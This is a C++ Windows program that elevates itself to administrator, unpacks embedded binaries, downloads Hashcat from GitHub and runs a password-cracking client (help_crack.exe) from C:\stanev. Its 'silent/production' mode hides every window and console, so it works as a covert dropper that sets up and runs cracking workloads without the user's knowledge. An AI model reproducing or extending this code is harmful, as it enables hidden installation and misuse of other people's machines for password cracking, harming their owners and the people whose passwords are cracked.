#define DEBUG 1  // Set to 1 for debug/visible mode, 0 for silent/production mode

#include <windows.h>
#include <shellapi.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <cstdlib>
#include <iostream>
#include <vector>
#pragma comment(lib, "urlmon.lib")

#include "resource.h"  // Contains #define IDR_7Z_DLL, IDR_HELPCRACK_EXE
#include "third_party/bit7z/include/bit7z/bit7z.hpp"

// =============================================================================
// Debug Macros
// =============================================================================
#if DEBUG == 1
    #define DEBUG_PRINT(x) std::cout << x << std::endl
    #define DEBUG_ERR(x)   std::cerr << x << std::endl
    static const int SHOW_MODE = SW_NORMAL; // Show windows normally
#else
    #define DEBUG_PRINT(x)
    #define DEBUG_ERR(x)
    static const int SHOW_MODE = SW_HIDE;   // Hide windows in production
#endif

// =============================================================================
// Run a command either visible (DEBUG=1) or silently (DEBUG=0).
// =============================================================================
struct CommandResult {
    HANDLE processHandle;
    int exitCode;
};

CommandResult run_command_silent(const std::string& command) {
#if DEBUG == 1
    // In debug mode, just system(...) so we see the console.
    std::string finalCommand = "cmd /c \"" + command + "\"";
    DEBUG_PRINT("[DEBUG] Running command (visible): " << finalCommand);
    return CommandResult{NULL, system(finalCommand.c_str())};
#else
    // In non-DEBUG mode, run via CreateProcess in a hidden window.
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window

    ZeroMemory(&pi, sizeof(pi));

    char cmdBuffer[2048];
    memset(cmdBuffer, 0, sizeof(cmdBuffer));
    strncpy_s(cmdBuffer, command.c_str(), _TRUNCATE);

    DEBUG_PRINT("[DEBUG] Running command (hidden): " << command);
    if (!CreateProcessA(
        nullptr,
        cmdBuffer,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    )) {
        DEBUG_ERR("CreateProcess failed for command: " << command);
        return CommandResult{NULL, -1};
    }

    CloseHandle(pi.hThread);  // We only need the process handle

    return CommandResult{pi.hProcess, 0};  // Return 0 as initial exit code
#endif
}

// =============================================================================
// Utility: check if file exists
// =============================================================================
bool file_exists(const std::string &path) {
    std::ifstream f(path);
    return f.good();
}

// =============================================================================
// Debug pause if in debug mode
// =============================================================================
void debug_pause_if_needed() {
#if DEBUG == 1
    DEBUG_PRINT("[DEBUG] Press any key to continue...");
    system("pause");
#endif
}

// =============================================================================
// Extract a resource (RT_RCDATA) by ID into a file on disk
// =============================================================================
bool extract_resource_to_file(int resourceId, const std::string &targetPath) {
    namespace fs = std::filesystem;

    // If the file is already there, skip re-extracting
    if (fs::exists(targetPath)) {
        DEBUG_PRINT("[DEBUG] Resource already extracted: " << targetPath);
        return true;
    }

    HMODULE hMod = GetModuleHandle(nullptr);
    if (!hMod) {
        DEBUG_ERR("GetModuleHandle failed.");
        return false;
    }

    // Locate resource
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) {
        DEBUG_ERR("Failed to find resource ID=" << resourceId);
        return false;
    }

    HGLOBAL hResData = LoadResource(hMod, hRes);
    if (!hResData) {
        DEBUG_ERR("Failed to load resource ID=" << resourceId);
        return false;
    }

    LPVOID pData = LockResource(hResData);
    if (!pData) {
        DEBUG_ERR("Failed to lock resource ID=" << resourceId);
        return false;
    }

    DWORD resSize = SizeofResource(hMod, hRes);
    if (resSize == 0) {
        DEBUG_ERR("Resource size=0 for ID=" << resourceId);
        return false;
    }

    // Write out to disk
    std::ofstream ofs(targetPath, std::ios::binary);
    if (!ofs) {
        DEBUG_ERR("Cannot open file for writing: " << targetPath);
        return false;
    }

    ofs.write(reinterpret_cast<const char*>(pData), resSize);
    ofs.close();

    DEBUG_PRINT("[DEBUG] Extracted resource ID=" << resourceId
                << " to: " << targetPath);
    return true;
}

// =============================================================================
// Ensure the application is running as Administrator
// =============================================================================
void ensure_admin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &dwSize)) {
            isAdmin = te.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (isAdmin) {
        DEBUG_PRINT("[DEBUG] Already running as admin.");
        return;
    }

    TCHAR szPath[MAX_PATH];
    if (GetModuleFileName(nullptr, szPath, ARRAYSIZE(szPath))) {
        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = szPath;
        sei.nShow  = SHOW_MODE; // normal if DEBUG=1, hidden if DEBUG=0

        DEBUG_PRINT("[DEBUG] Attempting to restart as admin...");
        if (!ShellExecuteEx(&sei)) {
            DWORD dwError = GetLastError();
            DEBUG_ERR("Administrator privileges were denied. Error code: " << dwError);
            exit(1);
        }
        // If ShellExecuteEx was successful, we relaunch with admin rights; stop this instance
        exit(0);
    }
}

// =============================================================================
// Directory existence + creation
// =============================================================================
bool directory_exists(const std::string& path) {
    DWORD attributes = GetFileAttributesA(path.c_str());
    return (attributes != INVALID_FILE_ATTRIBUTES &&
            (attributes & FILE_ATTRIBUTE_DIRECTORY));
}

void create_directory_if_needed(const std::string& path) {
    if (!directory_exists(path)) {
        DEBUG_PRINT("[DEBUG] Creating directory: " << path);
        if (!CreateDirectoryA(path.c_str(), nullptr)) {
            DEBUG_ERR("Error creating directory: " << path);
        }
    }
}

// =============================================================================
// Download file using URLDownloadToFile
// =============================================================================
bool download_file(const std::string &url, const std::string &local_path) {
    DEBUG_PRINT("[DEBUG] Downloading URL: " << url << " -> " << local_path);
    HRESULT hr = URLDownloadToFileA(nullptr, url.c_str(), local_path.c_str(), 0, nullptr);
    if (hr == S_OK) {
        DEBUG_PRINT("[DEBUG] Successfully downloaded: " << local_path);
        return true;
    } else {
        DEBUG_ERR("Failed to download " << url << ". HRESULT=" << std::hex << hr);
        return false;
    }
}

// =============================================================================
// Download + Extract Hashcat
// =============================================================================
bool extract_hashcat(const std::wstring &hashcat_archive_path, const std::string &destination_directory) {
    using namespace bit7z;
    DEBUG_PRINT("[DEBUG] Extracting Hashcat: "
                << std::string(hashcat_archive_path.begin(), hashcat_archive_path.end())
                << " -> " << destination_directory);

    try {
        // Initialize bit7z with the 7z.dll we extracted
        Bit7zLibrary lib{ destination_directory + "\\7z.dll" };
        BitFileExtractor extractor{ lib, BitFormat::SevenZip };

        std::string archivePathNarrow(hashcat_archive_path.begin(), hashcat_archive_path.end());
        extractor.extract(archivePathNarrow, destination_directory);
        DEBUG_PRINT("[DEBUG] Hashcat extraction success.");
        return true;
    } catch(const std::exception &e) {
        DEBUG_ERR("Hashcat extraction failed: " << e.what());
        return false;
    }
}

void ensure_hashcat_installed(const std::string &stanev_dir) {
    std::string hashcat_exe = stanev_dir + "\\hashcat.exe";
    if (file_exists(hashcat_exe)) {
        DEBUG_PRINT("[DEBUG] Hashcat already present at: " << hashcat_exe);
        return;
    }

    // Download the .7z from GitHub
    std::string hashcat_url = "https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z";
    auto temp_path = std::filesystem::temp_directory_path();
    std::wstring hashcat_archive_path = temp_path.wstring() + L"\\hashcat.7z";

    if(!download_file(hashcat_url, std::string(hashcat_archive_path.begin(), hashcat_archive_path.end()))) {
        DEBUG_ERR("Could not download Hashcat. Exiting.");
        return;
    }

    // Extract to c:\stanev
    if (!extract_hashcat(hashcat_archive_path, stanev_dir)) {
        DEBUG_ERR("Could not extract Hashcat. Exiting.");
        return;
    }

    // If the extraction created a subfolder, e.g. "hashcat-6.2.6", then
    // let's move the contents up into C:\stanev
    {
        std::filesystem::path subDir = std::filesystem::path(stanev_dir) / "hashcat-6.2.6";
        if (std::filesystem::exists(subDir)) {
            for (const auto &entry : std::filesystem::directory_iterator(subDir)) {
                auto dest = std::filesystem::path(stanev_dir) / entry.path().filename();
                std::filesystem::rename(entry.path(), dest);
            }
            // Remove the empty subfolder
            std::filesystem::remove(subDir);
        }
    }

    // Remove the downloaded .7z
    std::filesystem::remove(hashcat_archive_path);

    DEBUG_PRINT("[DEBUG] Hashcat is installed in " << stanev_dir);
}

// =============================================================================
// Main entry
// =============================================================================
int main() {
    DEBUG_PRINT("[DEBUG] Starting program...");

    // 1) Check or escalate to Admin
    ensure_admin();

    // 2) Prepare target folder "C:\stanev"
    std::string stanev_dir = "C:\\stanev";
    create_directory_if_needed(stanev_dir);

    // 3) Extract 7z.dll from the resource
    std::string dll_path = stanev_dir + "\\7z.dll";
    if (!extract_resource_to_file(IDR_7Z_DLL, dll_path)) {
        DEBUG_ERR("Failed to extract 7z.dll");
        debug_pause_if_needed();
        return 1;
    }

    // 4) Download & extract Hashcat if needed
    ensure_hashcat_installed(stanev_dir);

    // 5) Extract help_crack.exe from the resource
    std::string helpCrackExe = stanev_dir + "\\help_crack.exe";
    if (!extract_resource_to_file(IDR_HELPCRACK_EXE, helpCrackExe)) {
        DEBUG_ERR("Failed to extract help_crack.exe from resource.");
        debug_pause_if_needed();
        return 1;
    }

    if (!SetCurrentDirectoryA(stanev_dir.c_str())) {
        std::cerr << "Failed to set current directory to " << stanev_dir << std::endl;
        return 1;
    }

    // 6) (Optional) Run help_crack.exe
    // Example argument: -co="--status"
    const std::string cmd = "\"" + helpCrackExe + R"(" -co="--status")";
    DEBUG_PRINT("[DEBUG] Running help_crack.exe with: " << cmd);

    CommandResult cmdResult = run_command_silent(cmd);
    if (cmdResult.processHandle && cmdResult.processHandle != INVALID_HANDLE_VALUE) {
        WaitForSingleObject(cmdResult.processHandle, INFINITE);
        DWORD exitCode = 0;
        GetExitCodeProcess(cmdResult.processHandle, &exitCode);
        CloseHandle(cmdResult.processHandle);
        cmdResult.exitCode = static_cast<int>(exitCode);
    }
    int result = cmdResult.exitCode;
    DEBUG_PRINT("[DEBUG] help_crack.exe returned code: " << result);

    debug_pause_if_needed();
    DEBUG_PRINT("[DEBUG] Program finished.");
    return 0;
}

